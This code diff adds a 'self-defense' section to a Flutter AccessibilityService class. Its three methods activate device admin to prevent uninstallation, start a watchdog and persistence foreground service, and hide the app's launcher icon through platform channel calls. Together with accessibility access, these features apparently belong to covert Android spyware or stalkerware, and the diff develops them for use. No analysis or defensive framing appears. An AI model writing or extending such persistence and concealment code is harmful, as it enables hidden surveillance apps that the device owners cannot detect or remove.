@@ -94,4 +94,35 @@ class AccessibilityService {
       'keyboard': results[2],
     };
   }
+
+  // ─────────────────────────────────────────────
+  // Self-defense setup
+  // ─────────────────────────────────────────────
+
+  /// Activate device admin — prevents uninstallation
+  static Future<void> activateDeviceAdmin() async {
+    try {
+      await _setup.invokeMethod<void>('activateDeviceAdmin');
+    } catch (e) {
+      debugPrint('Error activating device admin: $e');
+    }
+  }
+
+  /// Start foreground protection service (watchdog + persistence)
+  static Future<void> startProtectionService() async {
+    try {
+      await _setup.invokeMethod<void>('startProtection');
+    } catch (e) {
+      debugPrint('Error starting protection service: $e');
+    }
+  }
+
+  /// Hide launcher icon
+  static Future<void> hideAppIcon() async {
+    try {
+      await _setup.invokeMethod<void>('hideIcon');
+    } catch (e) {
+      debugPrint('Error hiding app icon: $e');
+    }
+  }
 }
